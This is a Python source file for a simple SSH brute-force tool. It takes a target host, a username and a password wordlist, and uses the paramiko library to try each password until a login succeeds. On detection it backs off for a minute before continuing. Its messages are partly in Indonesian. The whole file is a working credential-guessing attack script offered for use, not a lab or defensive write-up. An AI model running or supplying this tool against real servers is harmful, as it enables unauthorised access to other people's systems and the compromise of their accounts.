import paramiko
import socket
import time
from colorama import init, Fore

#warna
init()

Gren = Fore.GREEN
Blue = Fore.BLUE
Red  = Fore.RED

def banner():
	print("""\n\tSSH BRUTEFORCE SIMPLE PYTHON
 \t---==[ creator: alwannn5 ]==---  \n""")
banner()


def ssh_open(hostname, username, password):
	#ssh authenticate for client
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(hostname=hostname, username=username, password=password, timeout=3)
	except socket.error:
		print(f"{Red}Host : {hostname} tidak dapat terhubung!")
		return False
	except paramiko.AuthenticationException:
		print(f"{Red}[!] Invalid Login {username}:{password}")
		return False
	except paramiko.SSHException:
		print(f"{Blue} [!] Mengatur waktu login. server mendeteksi adanya serangan!!")
		time.sleep(60)
	except KeyboardInterrupt:
		print("\nExiting Program")
		return True
	else:
		print(f"{Gren}[+]Success Login \n\tHostname : {hostname}\n\tUsername : {username}\n\tPassword : {password}")
		return True

if __name__== "__main__":
	import argparse
	parser = argparse.ArgumentParser(description="SSH Bruteforcer Python :D")
	parser.add_argument("host", help="Hostname atau IP address SSH target")
	parser.add_argument("-u", "--user", help="Host username SSH target" )
	parser.add_argument("-P", "--passlist", help="Wordlist password file")
	

	args = parser.parse_args()
	host = args.host
	user = args.user
	passlist = args.passlist

	passlist = open(passlist).read().splitlines()
	for password in passlist:
		if ssh_open(host, user, password):
			break


